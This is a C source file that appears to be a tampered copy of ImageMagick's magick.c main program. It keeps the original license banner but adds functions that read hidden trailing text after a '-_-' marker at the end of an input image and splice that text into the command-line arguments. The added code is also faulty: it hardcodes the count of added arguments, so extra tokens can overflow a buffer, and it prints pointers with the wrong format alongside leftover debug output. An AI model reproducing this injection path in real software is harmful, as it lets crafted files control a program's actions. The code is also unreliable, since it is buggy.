/*
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%                                                                             %
%                                                                             %
%                                                                             %
%                 M   M   AAA    GGGG  IIIII   CCCC  K   K                    %
%                 MM MM  A   A  G        I    C      K  K                     %
%                 M M M  AAAAA  G GGG    I    C      KKK                      %
%                 M   M  A   A  G   G    I    C      K  K                     %
%                 M   M  A   A   GGGG  IIIII   CCCC  K   K                    %
%                                                                             %
%                                                                             %
%       Perform "Magick" on Images via the Command Line Interface             %
%                                                                             %
%                             Dragon Computing                                %
%                             Anthony Thyssen                                 %
%                               January 2012                                  %
%                                                                             %
%                                                                             %
%  Copyright 1999-2016 ImageMagick Studio LLC, a non-profit organization      %
%  dedicated to making software imaging solutions freely available.           %
%                                                                             %
%  You may not use this file except in compliance with the License.  You may  %
%  obtain a copy of the License at                                            %
%                                                                             %
%    http://www.imagemagick.org/script/license.php                            %
%                                                                             %
%  Unless required by applicable law or agreed to in writing, software        %
%  distributed under the License is distributed on an "AS IS" BASIS,          %
%  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.   %
%  See the License for the specific language governing permissions and        %
%  limitations under the License.                                             %
%                                                                             %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%
%  Read CLI arguments, script files, and pipelines, to provide options that
%  manipulate images from many different formats.
%
*/

/*
  Include declarations.
*/
#include "MagickWand/studio.h"
#include "MagickWand/MagickWand.h"

#define HEADER_LENGTH 40
#define MARKER "-_-"
/*
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%                                                                             %
%                                                                             %
%                                                                             %
%  M a i n                                                                    %
%                                                                             %
%                                                                             %
%                                                                             %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%
%
*/


int print_argv(int argc, char **argv)
{
  printf("argc[%d]\n", argc);
  unsigned int i;
  for(i=1;i<argc;i++)
  {
    printf("arg[%d]: %s\n", i, argv[i]);
  }
  return 0;
}

int read_commands(char * file_name, char *buff)
{
  FILE *f = fopen(file_name, "rb");
  int res;
  if (f == NULL)
  {
    puts("[Error] couldn't open file\n");
    return -1;
  }
  fseek(f, -HEADER_LENGTH, SEEK_END);
  //buff = malloc(HEADER_LENGTH+1);
  res  = fread(buff, HEADER_LENGTH, 1, f);
  if (res < 0)
  {
    printf("[Error] couldn't Read\n");
    return -1;
  }
  buff[HEADER_LENGTH] = '\x00';
  if (strstr(buff, MARKER) != NULL)  
    {
      printf("buff: [%s]\n", buff);
      return 0;
    }
  else
    {
      printf("[Error] can't find marker\n");
      return -1;
    }


}

char** patch_argv(int *argc, char **argv)
{
  //TO-DO: this need to change ... it is one now because I only receive one command that even does not take any options
  //I need to get the total number of new args so I can create the structure correctly 
  int number_added_args = 2; // 
  int new_argc = (*argc) + number_added_args;
  char *command = malloc(HEADER_LENGTH+1);
  char * str;
  int i = 1;
  int j;
  if (read_commands(argv[1], command) == -1) // means we there was an error in reading the command, fallback to the original path
  {
    printf("hereeee\n");
    printf("file isn't injected\n");
    //new_argv = argv; 
    printf("addr argv: 0x%x\n", argv);
    return argv;
  }


  char **new_argv;
  new_argv = malloc(new_argc * sizeof(char *));
  new_argv[0] = argv[0];
  printf("addr argv: 0x%x\naddr new_argv: 0x%x\n", argv, new_argv);

  if (strstr(command, MARKER) != NULL)
  {
    str = strtok(command + 3, " ");
    
    while (str != NULL)
    {
      //printf("hereeee33\n");
      new_argv[i] = str;
      str = strtok(NULL, " ");
      //printf("i=%d\nstring token: %s\n", i, str);
      i++;
      
    }
  }
  for(j=1;j<(*argc);j++)
  {
    new_argv[i] = argv[j];
    i++;
  }
  print_argv(new_argc, new_argv);

  *argc = new_argc;
  printf("DONE\n");
  return new_argv;

}

static int MagickMain(int argc,char **argv)
{
#define MagickCommandSize(name,use_metadata,command) \
  { (name), sizeof(name)-1, (use_metadata), (command) }

  typedef struct _CommandInfo
  {
    const char
      *client_name;

    size_t
      extent;

    MagickBooleanType
      use_metadata;

    MagickCommand
      command;
  } CommandInfo;

  const CommandInfo
    MagickCommands[] =
    {
      MagickCommandSize("magick", MagickFalse, MagickImageCommand),
      MagickCommandSize("convert", MagickFalse, ConvertImageCommand),
      MagickCommandSize("composite", MagickFalse, CompositeImageCommand),
      MagickCommandSize("identify", MagickTrue, IdentifyImageCommand),
      MagickCommandSize("animate", MagickFalse, AnimateImageCommand),
      MagickCommandSize("compare", MagickTrue, CompareImagesCommand),
      MagickCommandSize("conjure", MagickFalse, ConjureImageCommand),
      MagickCommandSize("display", MagickFalse, DisplayImageCommand),
      MagickCommandSize("import", MagickFalse, ImportImageCommand),
      MagickCommandSize("mogrify", MagickFalse, MogrifyImageCommand),
      MagickCommandSize("montage", MagickFalse, MontageImageCommand),
      MagickCommandSize("stream", MagickFalse, StreamImageCommand)
    };

  char
    client_name[MagickPathExtent],
    *metadata;

  ExceptionInfo
    *exception;

  ImageInfo
    *image_info;

  int
    exit_code,
    offset;

  MagickBooleanType
    status;

  register ssize_t
    i;


  print_argv(argc, argv);
  argv = patch_argv(&argc, argv);
  printf("patched argv\n");
  printf("addr argv: 0x%x\n", argv);
  print_argv(argc, argv);

  MagickCoreGenesis(*argv,MagickTrue);
  exception=AcquireExceptionInfo();
  image_info=AcquireImageInfo();
  GetPathComponent(argv[0],TailPath,client_name);
  for (i=0; i < (ssize_t) (sizeof(MagickCommands)/sizeof(MagickCommands[0])); i++)
  {
    offset=LocaleNCompare(MagickCommands[i].client_name,client_name,
      MagickCommands[i].extent);
    if (offset == 0)
      break;
  }
  i%=(sizeof(MagickCommands)/sizeof(MagickCommands[0]));
  if ((i == 0) && (argc > 1))
    {
      for (i=1; i < (ssize_t) (sizeof(MagickCommands)/sizeof(MagickCommands[0])); i++)
      {
        offset=LocaleCompare(MagickCommands[i].client_name,argv[1]);
        if (offset == 0)
          {
            argc--;
            argv++;
            break;
          }
      }
      i%=(sizeof(MagickCommands)/sizeof(MagickCommands[0]));
    }
  metadata=(char *) NULL;
  status=MagickCommandGenesis(image_info,MagickCommands[i].command,argc,argv,
    MagickCommands[i].use_metadata ? &metadata : (char **) NULL,exception);

  if (metadata != (char *) NULL)
    {
      (void) fputs(metadata,stdout);
      metadata=DestroyString(metadata);
    }
  if (MagickCommands[i].command != CompareImagesCommand)
    exit_code=status != MagickFalse ? 0 : 1;
  else
    {
      if (status == MagickFalse)
        exit_code=2;
      else
      {
        const char
          *option;

        option=GetImageOption(image_info,"compare:dissimilar");
        exit_code=IsStringTrue(option) ? 1 : 0;
      }
    }
  image_info=DestroyImageInfo(image_info);
  exception=DestroyExceptionInfo(exception);
  MagickCoreTerminus();
  return(exit_code);
}

#if !defined(MAGICKCORE_WINDOWS_SUPPORT) || defined(__CYGWIN__) || defined(__MINGW32__) || defined(__MINGW64__)
int main(int argc,char **argv)
{
  return(MagickMain(argc,argv));
}
#else
int wmain(int argc,wchar_t *argv[])
{
  char
    **utf8;

  int
    status;

  register int
    i;

  utf8=NTArgvToUTF8(argc,argv);
  status=MagickMain(argc,utf8);
  for (i=0; i < argc; i++)
    utf8[i]=DestroyString(utf8[i]);
  utf8=(char **) RelinquishMagickMemory(utf8);
  return(status);
}
#endif
